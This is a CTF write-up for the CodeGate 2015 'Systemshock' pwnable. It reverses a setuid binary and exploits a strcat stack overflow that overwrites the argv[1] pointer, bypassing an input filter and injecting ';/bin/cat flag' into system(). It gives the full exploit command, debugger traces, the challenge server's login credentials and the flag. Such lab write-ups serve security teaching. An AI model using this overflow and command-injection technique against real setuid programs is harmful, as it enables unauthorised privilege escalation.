# CodeGate General CTF 2015: Systemshock

**Category:** Pwnable
**Points:** 200
**Description:** 

>Login : ssh systemshock@54.65.236.17  
>Password : systemshocked  

## Write-up

Logging in via SSH puts us in a directory with two files of interest, the flag (which can be read by user systemshock-solved) and a binary called shock which we can execute and has setuid systemshock-solved permissions. The assumption here is that shock has some kind of vulnerability we are meant to exploit in order to be able to elevate our privileges to systemshock-solved and read the flag.

Let's download the binary and take a closer look at it:

>```bash
>root@debian:~/ctf/codegate/shk# file ./shock
>./shock: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0x15fb3a120bea64fa53993f6552d52d9e1370a5a9, stripped
>root@debian:~/ctf/codegate/shk# ./checksec.sh --file ./shock
>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
>No RELRO        Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   ./shock
>```

So we are dealing with a stripped (which means no symbols for debugging) 64-bit ELF binary with protection against stack overflows (in the form of a stack canary and an NX-stack) which is run on a system with ASLR enabled. Let's run the executable to see what it does:

>```bash
>root@debian:~/ctf/codegate/shk# ./shock 
>root@debian:~/ctf/codegate/shk# ./shock test
>id: test: No such user
>root@debian:~/ctf/codegate/shk# ./shock test1 test2
>id: test1: No such user
>```

It seems that the first argument, argv[1], is passed as a command line argument to the id binary.
In order to get a clear picture of how the binary functions, we'll load it up in IDA Pro to obtain pseudo-code of the main function:

>```c
>__int64 sub_40075C()
>{
>  size_t v0; // rax@2
>  char **i; // [sp+0h] [bp-10h]@1
>  __int64 v3; // [sp+8h] [bp-8h]@1
>
>  v3 = *MK_FP(__FS__, 40LL);
>  for ( i = environ; *i; ++i )
>  {
>    v0 = strlen(*i);
>    memset(*i, 0, v0);
>  }
>  return *MK_FP(__FS__, 40LL) ^ v3;
>}
>
>int __fastcall main_routine(__int64 a1, __int64 a2)
>{
>  int result; // eax@2
>  const unsigned __int16 v3; // ax@4
>  __int64 v4; // rdx@10
>  int i; // [sp+1Ch] [bp-124h]@3
>  int dest; // [sp+20h] [bp-120h]@1
>  __int64 v7; // [sp+128h] [bp-18h]@1
>
>  v7 = *MK_FP(__FS__, 40LL);
>  sub_40075C();
>  dest = 2122857;
>  if ( *(_QWORD *)(a2 + 8) )
>  {
>    strcat((char *)&dest, *(const char **)(a2 + 8));
>    for ( i = 0; i < strlen(*(const char **)(a2 + 8)) + 3; ++i )
>    {
>      v3 = (*__ctype_b_loc())[*((_BYTE *)&dest + i)];
>      if ( !(v3 & 8) && *((_BYTE *)&dest + i) != 32 )
>      {
>        result = 1;
>        goto LABEL_10;
>      }
>    }
>    result = system((const char *)&dest);
>  }
>  else
>  {
>    result = 0;
>  }
>LABEL_10:
>  v4 = *MK_FP(__FS__, 40LL) ^ v7;
>  return result;
>}
>```

The above code is relatively straightforward in that it first fills the user environment with null-bytes (using sub_40075C()) and subsequently concatenates argv[1], denoted by *(const char **)(a2 + 8), with the buffer dest. Next, it runs a loop of length strlen(argv[1]) and checks (using the __ctype_b_loc() lookup table) if all characters fall within the range [A-Za-z0-9\s]. If this is the case, it calls system() on the dest buffer. Let's clean up the above pseudo-code a little for clarity:

>```c
>__int64 zero_environ()
>{
>  size_t v0; // rax@2
>  char **i; // [sp+0h] [bp-10h]@1
>  __int64 v3; // [sp+8h] [bp-8h]@1
>
>  v3 = *MK_FP(__FS__, 40LL);
>  for ( i = environ; *i; ++i )
>  {
>    v0 = strlen(*i);
>    memset(*i, 0, v0);
>  }
>  return *MK_FP(__FS__, 40LL) ^ v3;
>}
>
>int __fastcall main_routine(__int64 a1, __int64 a2)
>{
>  int result; // eax@2
>  const unsigned __int16 v3; // ax@4
>  __int64 v4; // rdx@10
>  int i; // [sp+1Ch] [bp-124h]@3
>  char dest[264]; // [sp+20h] [bp-120h]@1
>  __int64 v7; // [sp+128h] [bp-18h]@1
>
>  v7 = *MK_FP(__FS__, 40LL);
>  zero_environ();
>  dest = "id "; //this is actually lea rax, [rbp+dest]; mov dword ptr [rax], 206469h
>  if (argv[1])
>  {
>    strcat(dest, argv[1]);
>    for ( i = 0; i < strlen(argv[1]) + 3; ++i )
>    {
>      v3 = (*__ctype_b_loc())[dest[i]];
>      if ( !(v3 & 8) && dest[i] != 32 )
>      {
>        result = 1;
>        goto LABEL_10;
>      }
>    }
>    result = system(dest);
>  }
>  else
>  {
>    result = 0;
>  }
>LABEL_10:
>  v4 = *MK_FP(__FS__, 40LL) ^ v7;
>  return result;
>}
>```

The system() function is the first obvious target, we control part of its input (which is of the form "id {argv[1]}") and we want to inject a command of the form "cat ./flag". However, since argv[1] is restricted to the character range [A-Za-z0-9\s] by the __ctype_b_loc() loop it won't be as simple as doing './shock "A; cat ./flag"'.

The next target is strcat(), vulnerable to a glaringly obvious buffer overflow (it appends bytes from the source buffer to the end of the destination buffer, identified by its null-byte, until it encounters a null-byte in the source buffer). We can append a string of arbitrary size to dest and overflow it beyond its allocated 264 bytes. But since we're dealing with a stack canary (see v7) that we cannot corrupt it won't be a simple RIP-overwrite.

### The vulnerability

Note that the stack overflow occurs before the sanitizing loop, whose length is determined by an evaluation of strlen(argv[1]). If we can make sure that argv[1] points to a string such that (strlen(argv[1])+3) will be low (eg. it points to a nullbyte or an address which is a few bytes removed from a nullbyte) and hence the loop will only check the first 3+n characters of the dest buffer, allowing us to inject arbitrary characters beyond that point. We can achieve this by overwriting the pointer to argv[1] which is located on the stack.

### Exploitation

The first step is identifying the distance between the dest buffer and the pointer to argv[1] on the stack. Rather than stepping through the binary in GDB and inspecting its memory to determine the proper distance, we decided to try various input lengths and noticed a couple of different crashes:

>```bash
>root@debian:~/ctf/codegate/shk# ./shock `python -c 'print "A"*511'`
>id: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: No such user
>*** stack smashing detected ***: ./shock terminated
>Segmentation fault
>root@debian:~/ctf/codegate/shk# ./shock `python -c 'print "A"*520'`
>id: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: No such user
>Segmentation fault
>root@debian:~/ctf/codegate/shk# ./shock `python -c 'print "A"*527'`
>Segmentation fault
>```

The first crash terminates as expected, with a stack smashing detection warning. The second still calls system() but doesn't display the stack smashing warning anymore and the third simply segfaults without any output.

Let's try that last one in GDB and see what happens:

>```asm
>root@debian:~/ctf/codegate/shk# gdb ./shock 
>GNU gdb (GDB) 7.4.1-debian
>Copyright (C) 2012 Free Software Foundation, Inc.
>License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
>This is free software: you are free to change and redistribute it.
>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
>and "show warranty" for details.
>This GDB was configured as "x86_64-linux-gnu".
>For bug reporting instructions, please see:
><http://www.gnu.org/software/gdb/bugs/>...
>Reading symbols from /root/ctf/codegate/shk/shock...(no debugging symbols found)...done.
>(gdb) r `python -c 'print "A"*527'`
>Starting program: /root/ctf/codegate/shk/shock `python -c 'print "A"*527'`
>
>Program received signal SIGSEGV, Segmentation fault.
>0x00007ffff7ad1d91 in ?? () from /lib/x86_64-linux-gnu/libc.so.6
>(gdb) info registers
>rax            0x0	0
>rbx            0x0	0
>rcx            0x1	1
>rdx            0x7fffffffea72	140737488349810
>rsi            0x7fffffffee90	140737488350864
>rdi            0x7fffff004141	140737471594817
>rbp            0x7fffffffe980	0x7fffffffe980
>rsp            0x7fffffffe838	0x7fffffffe838
>r8             0xfefefefefefefeff	-72340172838076673
>r9             0xfefefefefefefeff	-72340172838076673
>r10            0x0	0
>r11            0x7ffff7ad0090	140737348698256
>r12            0x400650	4195920
>r13            0x7fffffffea60	140737488349792
>r14            0x0	0
>r15            0x0	0
>rip            0x7ffff7ad1d91	0x7ffff7ad1d91
>eflags         0x10287	[ CF PF SF IF RF ]
>cs             0x33	51
>ss             0x2b	43
>ds             0x0	0
>es             0x0	0
>fs             0x0	0
>gs             0x0	0
>(gdb) disas 0x00007ffff7ad1d91, 0x00007ffff7ad1dff
>Dump of assembler code from 0x7ffff7ad1d91 to 0x7ffff7ad1dff:
>=> 0x00007ffff7ad1d91:	movdqu xmm1,XMMWORD PTR [rdi]
>   0x00007ffff7ad1d95:	pcmpeqb xmm0,xmm1
>   0x00007ffff7ad1d99:	pmovmskb edx,xmm0
>   0x00007ffff7ad1d9d:	test   edx,edx
>   0x00007ffff7ad1d9f:	jne    0x7ffff7ad1e1b
>   (...)
>End of assembler dump.
>(gdb) 
>```

Ok, so it looks like we have control over RDI

>```asm
>rdi            0x7fffff004141
>```

Since it crashes before system() is executed, we assume this is because we are somewhere in the execution path of strlen(). Even though the binary is stripped, we can still disassemble it's main function by disassembling the entire .text ELF segment:

>```asm
>(gdb) info files
>Symbols from "/root/ctf/codegate/shk/shock".
>Local exec file:
>	`/root/ctf/codegate/shk/shock', file type elf64-x86-64.
>	Entry point: 0x400650
>   (...)
>	0x0000000000400650 - 0x000000000040099c is .text
>	0x000000000040099c - 0x00000000004009a5 is .fini
>   (...)
>(gdb) disas 0x0000000000400650,0x000000000040099c
>   (...)
>   0x00000000004008c0:	call   0x4005e0 <strlen@plt>
>   0x00000000004008c5:	add    rax,0x3
>   0x00000000004008c9:	cmp    rbx,rax
>   0x00000000004008cc:	jb     0x400855
>   0x00000000004008ce:	lea    rax,[rbp-0x120]
>   0x00000000004008d5:	mov    rdi,rax
>   0x00000000004008d8:	call   0x400600 <system@plt>
>```

So we set a breakpoint and see what happens:

>```asm
>(gdb) break *0x00000000004008c0
>Breakpoint 1 at 0x4008c0
>(gdb) r `python -c 'print "A"*527'`
>Starting program: /root/ctf/codegate/shk/shock `python -c 'print "A"*527'`
>
>Breakpoint 1, 0x00000000004008c0 in ?? ()
>(gdb) display/2i $pc-2
>9: x/2i $pc-2
>   0x4008be:	mov    edi,eax
>=> 0x4008c0:	call   0x4005e0 <strlen@plt>
>(gdb) info registers
>rax            0x7fffff004141	140737471594817
>rbx            0x0	0
>rcx            0x0	0
>rdx            0x7fffffffea72	140737488349810
>rsi            0x7fffffffee90	140737488350864
>rdi            0x7fffff004141	140737471594817
>```

As we can see, we have overwritten RDI, being the argument to strlen (which is the argv[1] pointer), and have full control over it.

>```asm
>(gdb) r `python -c 'print "A"*525+"\x01\x02\x03\x04\x05\x06\x07\x08"'`
>(gdb) info registers
>(...)
>rdi            0x807060504030201	578437695752307201
>```

Let's see what argv[1] looks like when it isn't being overwritten

>```asm
>(gdb) r `python -c 'print "B"+"A"*523'`
>(gdb) x/6xb $di
>0x7fffffffec7c:	0x42	0x41	0x41	0x41	0x41	0x41
>```

Ok, given that we can overwrite argv[1], the easiest approach would be to see what lies at 0x7fffffffec00. If there's anything interesting there we only have to overwrite the least significant byte of argv[1].

>```asm
>(gdb) x/8xb $rdi-0x7c
>0x7fffffffec00:	0x39	0xec	0xff	0xff	0xff	0x7f	0x00	0x00
>```

Yup, this looks good. Only 6 bytes until a null-byte so (strlen(0x7fffffffec00)+3) = 9 meaning the loop will only sanitize the first 9 bytes of our argument.
Now lets put all this together:

* We need to append 525 bytes to dest to overwrite the least significant byte of the argv[1] pointer with our terminating null-byte
* This will allow us to include any character after dest[8]

If we want to append ";/bin/cat flag" to our the command executed by system() we end up with the following exploit and flag:

>```bash
>$ ./shock AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";/bin/cat flag"
>B9sdeage OVvn23oSx0ds9^^to NVxqjy is_extremely Hosx093t
>```